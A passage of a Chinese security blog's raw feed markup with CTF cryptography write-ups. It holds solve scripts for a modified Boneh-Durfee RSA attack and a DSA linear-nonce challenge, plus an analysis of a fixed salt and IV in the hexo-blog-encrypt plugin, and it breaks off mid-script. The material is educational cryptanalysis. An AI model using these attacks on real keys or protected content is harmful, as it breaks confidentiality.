class="line">d = x0 </span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n) </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;



&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01-RSA私钥过大的漏洞&quot;&gt;&lt;a href=&quot;#0x01-RSA私钥过大的漏洞&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    
    <category term="Research" scheme="http://example.com/tags/Research/"/>
    
  </entry>
  
  <entry>
    <title>hexo_blog_encrypt_analysis</title>
    <link href="http://example.com/2024/01/28/hexo-blog-encrypt-analysis/"/>
    <id>http://example.com/2024/01/28/hexo-blog-encrypt-analysis/</id>
    <published>2024-01-28T08:05:31.000Z</published>
    <updated>2024-01-28T10:43:34.691Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。</p><h2 id="0x01-探索"><a href="#0x01-探索" class="headerlink" title="0x01 探索"></a>0x01 探索</h2><p>进入一个页面搜集信息。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281608581.png" alt="image-20240128160800457"></p><p>给请求过程下断点，开始调试：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281749426.png" alt="image-20240128174904306"></p><p>于是追踪到相关逻辑。接下来，进入分析工作。</p><blockquote><p>也可以从<a href="https://github.com/D0n9X1n/hexo-blog-encrypt%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%87%E5%85%A5%E3%80%82">https://github.com/D0n9X1n/hexo-blog-encrypt直接下载开发版本，这里从样本分析的角度切入。</a></p></blockquote><p><a href="https://github.com/AL3XEI709/Symmetric_Cryptography/blob/main/hbe.js">node_modules\hexo-blog-encrypt\lib\hbe.js</a> </p><h2 id="0x02-hbe-js"><a href="#0x02-hbe-js" class="headerlink" title="0x02 hbe.js"></a>0x02 hbe.js</h2><p>部署在hexo中的文件结构长这样，很美观：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281756666.png" alt="image-20240128175614617"></p><p>直奔<code>lib/hbe.js</code>:</p><p>文件开头：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281812675.png" alt="image-20240128181206595"></p><ol><li><p>严格模式声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>常量声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptoObj = <span class="variable language_">window</span>.<span class="property">crypto</span> || <span class="variable language_">window</span>.<span class="property">msCrypto</span>;</span><br><span class="line"><span class="keyword">const</span> storage = <span class="variable language_">window</span>.<span class="property">localStorage</span>;</span><br></pre></td></tr></table></figure><p><code>crytoObj</code> 用于访问浏览器的加密功能，<code>storage</code> 用于本地存储。</p></li><li><p>加密相关参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> storageName = <span class="string">&#x27;hexo-blog-encrypt:#&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span><br><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>storageName</code>: 存储加密数据的键名，基于当前页面的路径。 </p></li><li><p><code>keySalt</code> 和 <code>ivSalt</code>:  用于生成密钥和初始化向量的盐值，通过 <code>textToArray</code> 函数将文本转换为字节数组。</p></li></ul></li><li><p>解析 HTML 元素：</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mainElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hexo-blog-encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> wrongPassMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;wpm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> wrongHashMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;whm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> dataElement = mainElement.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="string">&#x27;hbeData&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> encryptedData = dataElement.<span class="property">innerText</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HmacDigist</span> = dataElement.<span class="property">dataset</span>[<span class="string">&#x27;hmacdigest&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>mainElement</code> 获取 id 为 <code>&#39;hexo-blog-encrypt&#39;</code> 的 HTML 元素。</li><li><code>wrongPassMessage</code> 和 <code>wrongHashMessage</code> 分别是用于显示密码错误和哈希校验失败的消息。</li><li><code>dataElement</code> 获取标签名为 <code>&#39;script&#39;</code> 且具有属性 <code>&#39;hbeData&#39;</code> 的元素。</li><li><code>encryptedData</code> 获取该元素的文本内容，即加密的数据。</li><li><code>HmacDigist</code> 获取加密数据的 HMAC 值。</li></ul><ol start="5"><li>辅助函数：</li></ol><ul><li><code>hexToArray(s)</code>：将十六进制字符串转换为字节数组。</li><li><code>textToArray(s)</code>：将文本转换为字节数组。</li><li><code>arrayBufferToHex(arrayBuffer)</code>：将 ArrayBuffer 转换为十六进制字符串。</li><li><code>getExecutableScript(oldElem)</code>：根据给定的元素创建可执行的脚本。</li><li><code>convertHTMLToElement(content)</code>：将 HTML 字符串转换为 HTML 元素。</li></ul><p><strong>密钥的生成与处理</strong>：</p><p>在代码中，使用了 <code>getKeyMaterial</code>、<code>getHmacKey</code>、<code>getDecryptKey</code> 和 <code>getIv</code> 函数来生成密钥和初始化向量。这些函数使用了PBKDF2 导出密钥材料，使用 HMAC 进行数据完整性校验，以及使用 AES-CBC 进行对称加密。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281825214.png" alt="image-20240128182522073"></p><p>加密过程中，使用 AES-CBC 加密算法对明文进行加密，并使用 HMAC 对加密后的密文进行签名，以确保数据的完整性。解密过程中，则先使用密码解密数据，然后校验 HMAC，最后返回解密后的明文。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826731.png" alt="image-20240128182613626"></p><p>在解密过程中，除了解密数据外，还需要对解密后的明文进行 HMAC 校验，以确保数据在传输过程中未被篡改。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826027.png" alt="image-20240128182653973"></p><h2 id="0x03-存在的问题"><a href="#0x03-存在的问题" class="headerlink" title="0x03 存在的问题"></a>0x03 存在的问题</h2><p>在分析源码时，我注意到一个细节：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PBKDF2算法使用的salt每次都必须是唯一的，AES算法的IV也每次都必须唯一，否则会存在字节翻转的安全问题。</p><p>不过，这个漏洞已经在去年九月提了pr, 目前官方最新的版本得到了修复。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281832925.png" alt="image-20240128183255815"></p><p>如图，将salt改成了一次一密，并在所有主题下加入了<code>keysalt</code>和<code>ivsalt</code>两个变量。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个插件的开发者有一定的密码学基础，在 hexo 渲染和展示时将原文用AES进行加密。但AES的具体操作上存在安全问题。</p><p>这是笔者第一次做js代码的分析工作，感觉动态调试的作用相当大。与之类似地，二进制可执行文件的逆向工程也常常可以通过动态调试获取到一些关键线索。同时对于解决博客加密的问题，以前一直考虑部署在服务端情况下如何实现（并用Go写了demo），js的强大功能令我耳目一新，用短短二百余行核心代码就实现了加密&#x2F;解密&#x2F;校验的核心功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;p&gt;hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。&lt;</summary>
      
    
    
    
    
    <category term="dev" scheme="http://example.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>An_Interesting_CTF_Challenge_0x1</title>
    <link href="http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/"/>
    <id>http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/</id>
    <published>2024-01-27T07:06:50.000Z</published>
    <updated>2024-02-21T08:39:42.039Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="914607b84c8d4dd7972619106a7ce0952666c15c578521cfd7888493f6bfa990"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Days_Without_Internet</title>
    <link href="http://example.com/2024/01/25/Days-Without-Internet/"/>
    <id>http://example.com/2024/01/25/Days-Without-Internet/</id>
    <published>2024-01-25T15:06:44.000Z</published>
    <updated>2024-01-29T12:00:53.575Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="43dae15dd84a7a35b945a9c6cc46d8422ff415bf3a82b32bc139f494b41eef87">1ccc3afe3f8e8a6933effeff5e279474dabc45c9513abdcd9350e81646bf173688d54434ad4284470f65ba32ff04289492cf5a1e6795ece30ff512a23bb7e12f153a6c0a38e1b83bbb6babc028ca2ae5004d2140335cedff1612db32161b307824c18c5886b239d3968da245ef2b30130364e824578382a79696001fff110d66c0431f17690435b008aab19b40745abc1a30939aad8058ca1fb25c641fa4f848bf6a40312f3632f4c68c70913a84cf265f1e0bc9febee50b8414ef18b487f379f6a3cdfadb6089e1c411c3be136f65b448b8939f2ea1471d7e0afe5f9025a69eef955f7e749edc9f027c4b2eb38cabb17bde3d0d51e9c47b1e62ac97eb78ee7892c8485813b5b08de9d2e128b551a8f417e7ce35127c0298c9f4222279e6e9e2feb0ff567a704abaaf98629cb2d122c529c8f4e944bc247516d21d4d001f27c0612b009b37249509d41dffcca92031cb360cf3e5ad5bd60b3b58f6267441ef2720edfdecf201ed6119210f92a96bebda9267a269330a502fb49925607600138ff964257d8c0cab265eaa6d556b3b7c2d5a4706ecfde29690a3a8534ce8081ca659821115702d75f6aa660816b9005ebea61700120575799ad8ad87c99b9f5cefb698cd3cc95ad96e5e26d614b94194638a9e6225839ae567361bad6bba5bfe9dfc1aebc2e8bd671bc6684a6d33893af7ec1c0c0f588e180e3ccdf8ab495d59abd4cd3e6a2683f43c396cf8e77f559f6469879aa89bfbb79adf2e4c6fbe66db5307e782b99e7b913ca52096ee7bd1fe304905dbdb8a78b2003e0457f5d66dd9edbc6fc8a474924881333cc09f0c6f2463330759ee819fe384573e8da398f9ca33db9ce07e46f3dc0dce108c44485549ea4d89cf93a4c7fd6d6acb41ccba38dabf612290aa9557235d146731a52a0e241f19319bb9e6b9c0399cb166c473cf065c8c8ef5ae64909ad8bc92de99e89f42d0d72b0c1333f2062e487b3ef0fa151e48091656e01a3cb1fcf90dcae299305dfa71342b2aaed62c710e732f2acd1391ebe8851b753f170610133d466f18237f400c103826809f0cfb1d7588d614b9c15573615ae93bc81742ff3a9691fafb2b3d8799192185a33ebf071b7c0029083802da4c75fa4daf8fcf384bd1d1bd2abce1500b888489b4379d1e0669e9502e3dcc7b6894e2ada71a0f75b57eb1d4852712f7d0c53f92d3f3425e739ce298a55f4289f442a861600055fb8026693d283726b8ce5e1ca34108337566e8b28bf40a8e762f94e4ae43dc166147de258a1459541b15fa7c5f47e89123de9b3469e355745b245fe7857f8f34316563b5c6e20117ab1a2284329c530b0953de3a2819f6bdb114f9d0d3235ce497aeb9e4a7f422577b5225a92b273b98d62b9e58cbe343ca5868ab0c553bd9faf2e15ccd0880d4c6c276668a97d7f5afd353438aebcbe6140d5c5166f45407c25f11c00a8c7b5e945867ca9a2d3999823c43ebdae1ec2f8407c3c9071cf35b16e4b0b450aad5759d7cfd8fc3c12d083ad6a42a50e6c9291a48c62ea2817a8ca2d7b19ee3ea7fcebab8697f2b0572d478e53427c2ba6d3309a89e88b1522db6f987733b5a38393cca64af98e04caeaefebb2bc736669aff6a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码阅读捏。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read.</summary>
    
    
    
    
    <category term="Other" scheme="http://example.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Notes</title>
    <link href="http://example.com/2024/01/22/CTF_Notes/"/>
    <id>http://example.com/2024/01/22/CTF_Notes/</id>
    <published>2024-01-22T14:09:34.000Z</published>
    <updated>2024-02-13T15:56:39.355Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>[TOC]</p><h1 id="0x01-Not-Wiener"><a href="#0x01-Not-Wiener" class="headerlink" title="0x01. Not Wiener"></a>0x01. Not Wiener</h1><p>题目是变体的Boneh-Durfee attack, 需要在理解攻击原理后做调整。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = phi - getPrime(<span class="number">540</span>)  <span class="comment"># make sure it is big enough that wiener&#x27;s attack doesn&#x27;t work</span></span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于<code>d = phi - D </code> (令D为540位的随机素数)，比正常的多了个负号，故要做一些调整。</p><p>列出RSA等式：<br>$$<br>ed\equiv e(\phi(n)-D)\equiv-eD\equiv1\pmod\phi(n)<br>$$<br>去掉mod: $-eD&#x3D;1+k\phi(n)$</p><p>两边同时mod e: $-1\equiv k\phi(n)\equiv k(n-s)\pmod e$</p><p>其中$s&#x3D;p+q-1$，k是与D差不多大的负数。</p><p>考虑以下的二元多项式：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，所以(k, s)是f 的一个小根，可以用二元copper来解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="0x1-2-Boneh-Durfee的碎碎念"><a href="#0x1-2-Boneh-Durfee的碎碎念" class="headerlink" title="0x1.2 Boneh-Durfee的碎碎念"></a>0x1.2 Boneh-Durfee的碎碎念</h2><p>从上面的题也可以看出，Boneh-Durfee的核心就是Multivariate Coppersmith，也即多元Coppersmith。对于RSA公钥方程：<br>$$<br>ed\equiv1\pmod {\phi(n)}<br>$$<br>去掉取模符号：<br>$$<br>ed&#x3D;k\phi(n)+1<br>$$<br>同时模e:<br>$$<br>k\phi(n)+1&#x3D;0\pmod e<br>$$<br>令$s &#x3D; p+q-1$，则可以化成：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，其中(k, s)是f 的一个小根。</p><h1 id="0x02-Not-Wiener-Another"><a href="#0x02-Not-Wiener-Another" class="headerlink" title="0x02. Not Wiener(Another)"></a>0x02. Not Wiener(Another)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h1:%s r1:%s s1:%s&quot;</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h2:%s r2:%s s2:%s&quot;</span>%(h2,r2,s2))</span><br></pre></td></tr></table></figure><p>题目嵌套了标准Boneh-Durfee attack 和线性DSA攻击。</p><p>由cry()函数得之用的RSA加密的a, 同时d较小，用标准Boneh-Durfee attack就能求出a。</p><p>接下来是求线性关系的步骤。已知：<br>$$<br>(h_1+xr_1)k^{-1}\equiv s_1\pmod q<br>(h_2+xr_2)(ak+b)^{-1}\equiv s_2\pmod q<br>$$<br>一通相消得：<br>$$<br>(s_1k-h_1)r_2-(s_2(ak+b)-h_2)r1\equiv0\pmod q<br>$$<br>可以求k。得到k再带入一个式子求x，也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a =     <span class="comment">#Boneh-Durfee</span></span><br><span class="line">p= <span 